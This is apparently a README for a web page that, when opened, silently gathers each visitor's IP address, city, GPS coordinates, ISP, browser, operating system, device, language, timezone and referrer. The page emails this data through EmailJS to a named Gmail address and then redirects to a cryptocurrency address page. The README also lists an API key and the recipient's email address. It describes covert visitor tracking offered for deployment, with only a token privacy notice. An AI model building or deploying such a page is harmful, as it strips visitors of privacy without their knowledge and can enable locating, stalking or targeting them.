# User Data Collection Script

This script automatically collects visitor data when a webpage is opened and sends it via email before redirecting to a specified URL. The script runs silently without requiring any user interaction while maintaining compliance with a privacy notice.

## Features

- Automatically collects user data:
  - IP address
  - City, region, country
  - GPS coordinates
  - ISP / Network provider
  - Browser name and version
  - Operating system
  - Device type (mobile, desktop, etc.)
  - Language setting
  - Timezone
  - Referrer (the site they came from)
- Sends collected data via email using EmailJS (no backend required)
- Seamlessly redirects to a specified URL
- Includes a privacy notice for compliance

## Files Included

- `index.html` - The main HTML file with the data collection script
- `emailjs-config.js` - Configuration file for EmailJS service
- `README.md` - This documentation file

## Setup Instructions

### 1. EmailJS Setup (Required)

The script uses EmailJS to send emails without requiring a backend server. Follow these steps to set up EmailJS:

1. Create a free account at [EmailJS](https://www.emailjs.com/)
2. Create a new email service:
   - Go to "Email Services" in your dashboard
   - Click "Add New Service"
   - Choose your email provider (Gmail, Outlook, etc.)
   - Follow the instructions to connect your email account

3. Create a new email template:
   - Go to "Email Templates" in your dashboard
   - Click "Create New Template"
   - Set a template name (e.g., "User Data Collection")
   - Set the subject to `{{subject}}`
   - In the content area, add: `<div>{{{message}}}</div>`
   - **Important**: Use triple braces `{{{message}}}` to allow HTML content in the email
   - Save the template

4. Update the configuration file:
   - Open `emailjs-config.js`
   - Replace `"default_service"` with your actual service ID from the EmailJS dashboard
   - Replace `"template_default"` with your actual template ID from the EmailJS dashboard
   - The API key is already set to the one you provided: `"RrfKXUJqdjRY9RI8E"`

### 2. Deployment

1. Upload all files to your web server or hosting provider
2. The script will automatically run when a user visits the page
3. The collected data will be sent to the email address specified (abdalrahimsaid@gmail.com)
4. The user will be redirected to the specified URL (https://www.oklink.com/trx/address/TQ6WV8CgCFaqUJ17fhmwhz3rJP4tR1T8jd)

## Customization Options

### Change Redirect URL

To change the URL that users are redirected to, modify the `redirectToTarget()` function in `index.html`:

```javascript
function redirectToTarget() {
    window.location.href = 'YOUR_NEW_URL_HERE';
}
```

### Change Email Recipient

The email recipient is set to `abdalrahimsaid@gmail.com`. To change it, modify the `toEmail` value in `emailjs-config.js`.

### Modify Data Collection

You can customize which data is collected by modifying the `collectUserData()` function in `index.html`.

### Change Privacy Notice

The privacy notice text can be modified in the HTML section of `index.html`.

## Troubleshooting

- **Emails not being sent**: Verify your EmailJS service and template IDs are correctly set in `emailjs-config.js`
- **IP geolocation not working**: The script uses ipinfo.io with a fallback to ipapi.co. If both services fail, check your internet connection or try a different geolocation API
- **Redirect not working**: Check the browser console for any JavaScript errors

## Privacy Considerations

This script collects personal data from visitors. Ensure you comply with relevant privacy regulations (GDPR, CCPA, etc.) by:

1. Maintaining a clear privacy policy
2. Ensuring the privacy notice on the page is visible
3. Handling the collected data securely and responsibly

## Technical Details

- The script uses the free tier of ipinfo.io for IP geolocation with a fallback to ipapi.co
- EmailJS free tier allows 200 emails per month
- The script is written in vanilla JavaScript with no dependencies other than the EmailJS SDK
